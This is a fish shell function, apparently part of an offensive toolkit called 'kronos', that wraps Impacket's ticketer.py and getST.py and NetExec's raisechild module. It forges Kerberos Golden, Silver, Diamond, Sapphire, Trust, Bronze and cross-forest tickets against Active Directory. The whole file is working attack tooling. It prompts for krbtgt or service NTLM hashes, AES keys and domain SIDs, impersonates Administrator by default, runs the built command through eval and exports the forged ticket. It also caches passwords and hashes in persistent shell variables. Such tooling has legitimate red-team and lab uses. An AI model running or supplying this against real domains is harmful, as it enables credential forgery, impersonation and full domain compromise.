# description: Create Golden, Silver, Diamond, Sapphire, Trust, Cross-Forest, and Bronze Tickets
function __kronos_ticket --description "Create advanced AD tickets using ticketer.py, getST.py, or NetExec"
    set -l ticket_types golden silver diamond sapphire trust cross-forest bronze
    
    argparse h/help u/user= d/domain= S/sid= H/hash= s/spn= I/user-id= G/groups= A/auth-user= P/auth-pass= L/auth-hash= K/aes-key= E/extra-sid= q/quiet X/edit-cmd -- $argv
    or return 1

    if set -q _flag_help
        echo "Usage: kronos ticket [subcommand] [OPTIONS]"
        echo ""
        echo "Create advanced AD tickets using various tools (Impacket, NetExec)."
        echo ""
        echo "Subcommands: golden, silver, diamond, sapphire, trust, cross-forest, bronze"
        echo ""
        echo "Options:"
        echo "  -u, --user NAME      User to impersonate (default: Administrator)"
        echo "  -d, --domain NAME    Target domain name"
        echo "  -S, --sid SID        Domain SID"
        echo "  -H, --hash HASH      Target NTLM hash (krbtgt, service, etc.)"
        echo "  -s, --spn SPN        Target SPN (for silver/bronze tickets)"
        echo "  -A, --auth-user NAME Service/Low-priv account for request-based attacks"
        echo "  -E, --extra-sid SID  Extra SID for cross-forest/trust tickets"
        echo "  -q, --quiet          Skip prompts and use cached/default values"
        echo "  -X, --edit-cmd       Inspect and edit the command before execution"
        echo "  -h, --help           Show this help message"
        return 0
    end

    set -l subaction $argv[1]
    set -l wizard 0
    
    if test -z "$subaction"
        if not set -q _flag_quiet
            set subaction (__kronos_ask_choice "Pick a ticket type to forge" "golden" $ticket_types); or return 1
            set wizard 1
        else
            echo "error: subcommand required in quiet mode" >&2; return 1
        end
    else if contains -- "$subaction" $ticket_types
        if not set -q _flag_quiet; set wizard 1; end
        if test (count $argv) -gt 0; and test "$argv[1]" = "$subaction"; set -e argv[1]; end
    end

    # Capture flags
    set -l domain $_flag_domain
    set -l user $_flag_user
    set -l sid $_flag_sid
    set -l hash $_flag_hash
    set -l spn $_flag_spn
    set -l user_id $_flag_user_id
    set -l groups $_flag_groups
    set -l auth_user $_flag_auth_user
    set -l auth_pass $_flag_auth_pass
    set -l auth_hash $_flag_auth_hash
    set -l aes_key $_flag_aes_key
    set -l extra_sid $_flag_extra_sid
    set -l etype "aes256"

    if test "$wizard" -eq 1
        set_color cyan; echo "[*] Starting $subaction ticket wizard..."; set_color normal
        
        # 0. Target (IP/Hostname)
        set -l def_target "$__KRONOS_CACHE_TICKET_TARGET"
        set -l src_target "Cache"
        if test -z "$def_target"
            set def_target "$TGT"; set src_target "TGT"
            if test -z "$def_target"; set def_target "$TGT_DC_IP"; set src_target "TGT_DC_IP"; end
            if test -z "$def_target"; set def_target "$TGT_DC"; set src_target "TGT_DC"; end
            if test -z "$def_target"; set def_target "$TGT_HOSTS[1]"; set src_target "TGT_HOSTS"; end
        end
        if test -n "$target"; set def_target "$target"; set src_target "CLI Arg"; end
        set target (__kronos_ask "Target DC IP/Hostname" "$def_target" "$src_target"); or return 1
        set -U __KRONOS_CACHE_TICKET_TARGET "$target"

        # 1. Domain
        set -l def_domain "$__KRONOS_CACHE_TICKET_DOMAIN"
        set -l src_domain "Cache"
        if test -z "$def_domain"
            set def_domain "$TGT_HOSTS[1]"; set src_domain "TGT_HOSTS"
            if test -z "$def_domain"; set def_domain "$TGT_DC_DOMAIN"; set src_domain "TGT_DC_DOMAIN"; end
        end
        if test -n "$domain"; set def_domain "$domain"; set src_domain "CLI Arg"; end
        set domain (__kronos_ask "Domain Name" "$def_domain" "$src_domain"); or return 1
        set -U __KRONOS_CACHE_TICKET_DOMAIN "$domain"

        # 2. Authentication Credentials (Diamond, Sapphire, Bronze, Cross-Forest)
        if contains -- "$subaction" diamond sapphire bronze cross-forest
            set -l user_label "Auth Username"
            if test "$subaction" = "bronze"; set user_label "Service Account Username"; end
            if test "$subaction" = "cross-forest"; set user_label "Child Domain Auth Username"; end
            
            set -l def_auth_user "$__KRONOS_CACHE_TICKET_AUTH_USER"
            set -l src_user "Cache"
            if test -z "$def_auth_user"
                set def_auth_user "$TGT_USERNAME"; set src_user "TGT_USERNAME"
                if test -z "$def_auth_user"; set def_auth_user "$TGT_CRED_USERNAME"; set src_user "TGT_CRED_USERNAME"; end
            end
            if test -n "$auth_user"; set def_auth_user "$auth_user"; set src_user "CLI Arg"; end
            set auth_user (__kronos_ask "$user_label" "$def_auth_user" "$src_user"); or return 1
            set -U __KRONOS_CACHE_TICKET_AUTH_USER "$auth_user"

            set -l def_auth_val "$__KRONOS_CACHE_TICKET_AUTH_VAL"
            set -l src_auth_val "Cache"
            if test -z "$def_auth_val"
                set def_auth_val "$TGT_PASSWORD"; set src_auth_val "TGT_PASSWORD"
                if test -z "$def_auth_val"; set def_auth_val "$TGT_CRED_PASSWORD"; set src_auth_val "TGT_CRED_PASSWORD"; end
            end
            if test -n "$auth_pass"; set def_auth_val "$auth_pass"; set src_auth_val "CLI Pass"; end
            if test -n "$auth_hash"; set def_auth_val "$auth_hash"; set src_auth_val "CLI Hash"; end
            set -l auth_input (__kronos_ask "Auth Password or Hash" "$def_auth_val" "$src_auth_val"); or return 1
            set -U __KRONOS_CACHE_TICKET_AUTH_VAL "$auth_input"
            
            if string match -rq '^[a-fA-F0-9]{32}:[a-fA-F0-9]{32}$|^[a-fA-F0-9]{32}$' -- "$auth_input"
                set auth_hash "$auth_input"; set auth_pass ""
            else
                set auth_pass "$auth_input"; set auth_hash ""
            end
        end

        # 3. Hash (NTLM of krbtgt or Service) - Golden/Silver/Diamond/Sapphire/Trust
        if contains -- "$subaction" golden silver diamond sapphire trust
            set -l hash_label "Target NTLM Hash"
            switch "$subaction"
                case golden diamond sapphire; set hash_label "krbtgt NTLM Hash"
                case silver; set hash_label "Service NTLM Hash"
                case trust; set hash_label "Trust Account NTLM Hash"
            end
            set -l def_hash "$__KRONOS_CACHE_HASH"
            set -l src_hash "Cache"
            if test -z "$def_hash"; set def_hash "$TGT_PASSWORD"; set src_hash "TGT_PASSWORD"; end
            if test -n "$hash"; set def_hash "$hash"; set src_hash "CLI Arg"; end
            set hash (__kronos_ask "$hash_label" "$def_hash" "$src_hash"); or return 1
            set -U __KRONOS_CACHE_HASH "$hash"
        end

        # 4. AES / SID / SPN
        if test "$subaction" != "cross-forest"
            if contains -- "$subaction" golden diamond sapphire
                set -l def_aes "$__KRONOS_CACHE_AES_KEY"
                if test -n "$aes_key"; set def_aes "$aes_key"; end
                set aes_key (__kronos_ask "krbtgt AES256 Key (optional)" "$def_aes")
                set -U __KRONOS_CACHE_AES_KEY "$aes_key"
            end

            if contains -- "$subaction" golden silver diamond sapphire trust
                set -l def_sid "$__KRONOS_CACHE_SID"
                if test -n "$sid"; set def_sid "$sid"; end
                set sid (__kronos_ask "Domain SID" "$def_sid"); or return 1
                set -U __KRONOS_CACHE_SID "$sid"
            end

            if contains -- "$subaction" silver bronze trust
                set -l def_spn "$__KRONOS_CACHE_TICKET_SPN"
                if test -n "$spn"; set def_spn "$spn"; end
                set spn (__kronos_ask "Target SPN (e.g. cifs/srv01.domain.local)" "$def_spn"); or return 1
                set -U __KRONOS_CACHE_TICKET_SPN "$spn"
            end

            # Impersonated User
            set -l user_prompt "User to Impersonate"
            if test "$subaction" = "sapphire"; set user_prompt "User to Impersonate (via S4U2Self)"; end
            set -l def_user "$__KRONOS_CACHE_USER"
            if test -z "$def_user"; set def_user "Administrator"; end
            if test -n "$user"; set def_user "$user"; end
            set user (__kronos_ask "$user_prompt" "$def_user"); or return 1
            set -U __KRONOS_CACHE_USER "$user"
        else
            # Cross-forest ETYPE
            set etype (__kronos_ask_choice "Encryption Type" "aes256" "aes256" "rc4"); or return 1
        end
    else
        # Fallbacks for non-wizard mode
        if test -z "$target"; set target "$TGT"; end
        if test -z "$domain"
            set domain "$__KRONOS_CACHE_TICKET_DOMAIN"
            if test -z "$domain"; set domain "$TGT_HOSTS[1]"; end
            if test -z "$domain"; set domain "$TGT_DC_DOMAIN"; end
        end
        if test -z "$user"; set user "Administrator"; end
    end

    if test -z "$target"; echo "error: target is required"; return 1; end

    set -l final_cmd ""

    if test "$subaction" = "bronze"
        set -l impacket_cmd ""
        if command -v getST.py >/dev/null; set impacket_cmd getST.py
        else if command -v impacket-getST >/dev/null; set impacket_cmd impacket-getST
        else; echo "error: getST.py not found."; return 1; end

        set -l st_args -spn "$spn" -impersonate "$user" -force-forwardable -dc-ip "$target"
        if test -n "$auth_hash"
            set -a st_args -hashes ":$auth_hash"
        else
            set -a st_args -password "$auth_pass"
        end
        set -a st_args "$domain/$auth_user"
        set final_cmd "$impacket_cmd "(string join ' ' -- $st_args)

    else if test "$subaction" = "cross-forest"
        __kronos_check_dep nxc; or return 1
        # FIX: Using set -a to append instead of overwriting the protocol and target
        set -l nxc_args ldap "$target" -u "$auth_user"
        if test -n "$domain"; set -a nxc_args -d "$domain"; end
        if test -n "$auth_hash"
            set -a nxc_args -H "$auth_hash"
        else
            set -a nxc_args -p "$auth_pass"
        end
        set -a nxc_args -M raisechild -o ETYPE="$etype"
        set final_cmd "nxc "(string join ' ' -- $nxc_args)

    else
        set -l impacket_cmd ""
        if command -v ticketer.py >/dev/null; set impacket_cmd ticketer.py
        else if command -v impacket-ticketer >/dev/null; set impacket_cmd impacket-ticketer
        else; echo "error: ticketer not found."; return 1; end

        set -l ticket_args -nthash "$hash" -domain-sid "$sid" -domain "$domain"
        if test -n "$aes_key"; set -a ticket_args -aesKey "$aes_key"; end
        if test -n "$target"; set -a ticket_args -dc-ip "$target"; end

        set -l final_target_user "$user"
        switch "$subaction"
            case diamond
                set -a ticket_args -request -user "$domain/$auth_user"
                if test -n "$user_id"; set -a ticket_args -user-id "$user_id"; else; set -a ticket_args -user-id 500; end
                if test -n "$groups"; set -a ticket_args -groups "$groups"; else; set -a ticket_args -groups "512,513,518,519,520"; end
                if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash" -password "";
                else; set -a ticket_args -password "$auth_pass"; end
            case sapphire
                set -a ticket_args -request -user "$auth_user" -user-id "$user_id" -impersonate "$user"
                if test -n "$auth_hash"; set -a ticket_args -hashes "$auth_hash" -password "";
                else; set -a ticket_args -password "$auth_pass"; end
                set final_target_user "baduser"
            case silver trust
                set -a ticket_args -spn "$spn"
        end
        set -a ticket_args "$final_target_user"
        set final_cmd "$impacket_cmd "(string join ' ' -- $ticket_args)
    end

    if test -z "$final_cmd"; echo "error: invalid ticket type"; return 1; end
    if set -q _flag_edit_cmd; set final_cmd (__kronos_edit_cmd "$final_cmd"); or return 1; end

    set -l bin (string split ' ' -- $final_cmd)[1]
    __kronos_check_dep $bin; or return 1
    
    echo "[*] Executing $subaction ticket attack via $bin..."
    eval $final_cmd
    
    # Post-execution logic
    set -l forged_user "$user"
    if test "$subaction" = "sapphire"; set forged_user "baduser"; end
    if test "$subaction" = "cross-forest"; set forged_user "Administrator"; end
    
    if test -f "$forged_user.ccache"
        set -gx KRB5CCNAME "$PWD/$forged_user.ccache"
        echo "[+] Ticket saved and exported to KRB5CCNAME=$KRB5CCNAME"
    else
        set -l latest_ccache (ls -t *.ccache 2>/dev/null | head -n 1)
        if test -n "$latest_ccache"
            set -gx KRB5CCNAME "$PWD/$latest_ccache"
            echo "[+] Detected new ticket and exported to KRB5CCNAME=$KRB5CCNAME"
        end
    end
end
